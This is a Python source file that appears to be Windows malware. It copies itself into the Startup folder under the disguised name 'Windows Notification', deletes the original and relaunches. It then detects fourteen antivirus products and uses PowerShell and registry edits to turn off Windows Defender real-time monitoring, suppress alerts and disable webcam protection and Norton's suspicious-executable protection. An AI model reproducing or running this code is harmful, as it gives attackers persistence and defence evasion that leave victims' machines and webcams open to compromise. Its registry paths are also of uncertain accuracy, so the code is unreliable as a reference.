import os
import subprocess
import winreg
import sys
import ctypes
import shutil

def copy_to_startup():
    try:
        script_path = os.path.abspath(__file__)
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        script_in_startup = os.path.join(startup_folder, os.path.basename(__file__))
        if not os.path.exists(script_in_startup):
            shutil.copy(script_path, startup_folder)
            _, extension = os.path.splitext(script_path)
            new_name = os.path.join(startup_folder, 'Windows Notification' + extension)
            os.rename(script_in_startup, new_name)
            os.remove(script_path)
            os.system('start "" "{}"'.format(new_name))
            sys.exit()
    except:
        pass

copy_to_startup()

def disable_antivirus_notifications(antivirus_programs):
    for antivirus, service_name in antivirus_programs.items():
        is_running = False
        for process in os.popen('tasklist').readlines():
            if service_name.lower() in process.lower():
                is_running = True
                break
        if is_running:
            print(f"{antivirus} is currently running.")
            disable_notifications(antivirus)

def disable_notifications(antivirus):
    try:
        if antivirus == "Windows Defender":
            subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"])
            print("Windows Defender notifications disabled successfully.")
        elif antivirus == "Avast":
            subprocess.run(["reg", "add", "HKCU\Software\AVAST Software\Avast\Notifications", "/v", "PopupEnabled", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("Avast notifications disabled successfully.")
            def disable_webcam_shield():
                key_path = r"SOFTWARE\Avast\Settings"
                value_name = "WebcamShieldEnabled"
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 0)
                    print("Avast Webcam Shield disabled successfully.")
                except Exception as e:
                    print(f"Error: {e}")
                finally:
                    winreg.CloseKey(key)
            disable_webcam_shield()
        elif antivirus == "AVG":
            subprocess.run(["reg", "add", "HKCU\Software\AVG\AV", "/v", "ShowAlertNotification", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("AVG notifications disabled successfully.")
            def disable_webcam_shield():
                key_path = r"SOFTWARE\AVG\Protection"
                value_name = "webcam_protection"
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 0)
                    print("AVG Webcam Shield disabled successfully.")
                except Exception as e:
                    print(f"Error: {e}")
                finally:
                    winreg.CloseKey(key)
            disable_webcam_shield()
        elif antivirus == "McAfee":
            subprocess.run(["reg", "add", "HKCU\Software\McAfee\Shared Components\On Access Scanner\Settings", "/v", "FirstTime", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("McAfee notifications disabled successfully.")
            def disable_webcam_shield():
                key_path = r"SOFTWARE\McAfee\MPF\Privacy"
                value_name = "WebcamProtection"
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 0)
                    print("McAfee Webcam Shield disabled successfully.")
                except Exception as e:
                    print(f"Error: {e}")
                finally:
                    winreg.CloseKey(key)
            disable_webcam_shield()
        elif antivirus == "Norton":
            subprocess.run(["reg", "add", "HKCU\Software\Norton\{0C55C096-0F1D-4F28-AAA2-85EF591126E7}\NortonSecurity\Settings", "/v", "ShowAlerts", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("Norton notifications disabled successfully.")
            def disable_norton_features():
                webcam_shield_key_path = r"SOFTWARE\Norton\NSS\Engine\22.21.3.1\Settings"
                webcam_shield_value_name = "WebcamProtection"
                suspicious_exe_key_path = r"SOFTWARE\Norton\NSS\Engine\22.21.3.1\Settings\IDS\Exclusion"
                suspicious_exe_value_name = "ScanExcluded"
                try:
                    webcam_shield_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, webcam_shield_key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(webcam_shield_key, webcam_shield_value_name, 0, winreg.REG_DWORD, 0)
                    print("Norton Webcam Shield disabled successfully.")
                    winreg.CloseKey(webcam_shield_key)
                except FileNotFoundError:
                    print("Norton Webcam Shield settings key not found.")
                try:
                    suspicious_exe_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, suspicious_exe_key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(suspicious_exe_key, suspicious_exe_value_name, 0, winreg.REG_DWORD, 0)
                    print("Norton Suspicious Executables Protection disabled successfully.")
                    winreg.CloseKey(suspicious_exe_key)
                except FileNotFoundError:
                    print("Norton Suspicious Executables Protection settings key not found.")
            disable_norton_features()
        elif antivirus == "Kaspersky":
            subprocess.run(["reg", "add", "HKCU\Software\KasperskyLab\protected\AVP22\profiles\Monitor\settings", "/v", "UnpNotifyMode", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("Kaspersky notifications disabled successfully.")
            def disable_kaspersky_webcam_shield():
                key_path = r"SOFTWARE\KasperskyLab\protected\AVP22.0\environment\NAGENT\settings"
                value_name = "WebcamControlEnabled"
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 0)
                    print("Kaspersky Webcam Shield disabled successfully.")
                except Exception as e:
                    print(f"Error: {e}")
                finally:
                    winreg.CloseKey(key)
            disable_kaspersky_webcam_shield()
        elif antivirus == "Bitdefender":
            subprocess.run(["reg", "add", "HKCU\Software\Bitdefender\Desktop\Profiles", "/v", "PopupAllowed", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("Bitdefender notifications disabled successfully.")
        elif antivirus == "Avira":
            subprocess.run(["reg", "add", "HKCU\Software\Avira\Antivirus", "/v", "NotificationsEnabled", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("Avira notifications disabled successfully.")
            def disable_avira_webcam_protection():
                key_path = r"SOFTWARE\Avira\Antivirus\APC"
                value_name = "EnableWebcamProtection"
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 0)
                        print("Avira Webcam Protection disabled successfully.")
                except FileNotFoundError:
                    print("Avira registry key not found.")
                except Exception as e:
                    print(f"Error: {e}")
            disable_avira_webcam_protection()
        elif antivirus == "ESET":
            subprocess.run(["reg", "add", "HKCU\Software\ESET\ESET Security\CurrentVersion\Notifications", "/v", "Balloon", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("ESET notifications disabled successfully.")
        elif antivirus == "Trend Micro":
            subprocess.run(["reg", "add", "HKCU\Software\TrendMicro\TrendMicro\CurrentVersion\TrayIcon", "/v", "ShowBubbleNotification", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("Trend Micro notifications disabled successfully.")
        elif antivirus == "Sophos":
            subprocess.run(["reg", "add", "HKCU\Software\Sophos\Sophos UI\Notifications", "/v", "BalloonCount", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("Sophos notifications disabled successfully.")
        elif antivirus == "Malwarebytes":
            subprocess.run(["reg", "add", "HKCU\Software\Malwarebytes\Anti-Malware", "/v", "NotifyUser", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("Malwarebytes notifications disabled successfully.")
            def disable_malwarebytes_webcam_protection():
                key_path = r"SOFTWARE\Malwarebytes\Anti-Malware"
                value_name = "DisableWebcamProtection"
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 1)
                        print("Malwarebytes Webcam Protection disabled successfully.")
                except FileNotFoundError:
                    print("Malwarebytes registry key not found.")
                except Exception as e:
                    print(f"Error: {e}")
            disable_malwarebytes_webcam_protection()
        elif antivirus == "Panda":
            subprocess.run(["reg", "add", "HKCU\Software\Panda Security\Panda Security Protection", "/v", "EnableAnnounces", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("Panda notifications disabled successfully.")
            def disable_panda_webcam_protection():
                key_path = r"SOFTWARE\Panda Security\Panda Security Protection\APFWF"
                value_name = "WebcamProtection"
                try:
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:
                        winreg.SetValueEx(key, value_name, 0, winreg.REG_DWORD, 0)
                        print("Panda Webcam Protection disabled successfully.")
                except FileNotFoundError:
                    print("Panda registry key not found.")
                except Exception as e:
                    print(f"Error: {e}")
            disable_panda_webcam_protection()
        elif antivirus == "Symantec":
            subprocess.run(["reg", "add", "HKCU\Software\Symantec\Symantec Endpoint Protection\SMC\SYLINK\SyLink", "/v", "ShowTrayIconBalloon", "/t", "REG_DWORD", "/d", "0", "/f"])
            print("Symantec notifications disabled successfully.")
        else:
            print(f"Notification settings for {antivirus} cannot be modified programmatically.")
    except Exception as e:
        print(f"Error disabling {antivirus} notifications: {str(e)}")

if __name__ == "__main__":
    antivirus_programs = {
        "Windows Defender": "MsMpEng.exe",
        "Avast": "AvastSvc.exe",
        "AVG": "avgsvc.exe",
        "McAfee": "mfemms.exe",
        "Norton": "NS.exe",
        "Kaspersky": "avp.exe",
        "Bitdefender": "bdagent.exe",
        "Avira": "avguard.exe",
        "ESET": "egui.exe",
        "Trend Micro": "ntrtscan.exe",
        "Sophos": "savservice.exe",
        "Malwarebytes": "mbamservice.exe",
        "Panda": "PSANHost.exe",
        "Symantec": "ccSvcHst.exe"
    }
    disable_antivirus_notifications(antivirus_programs)
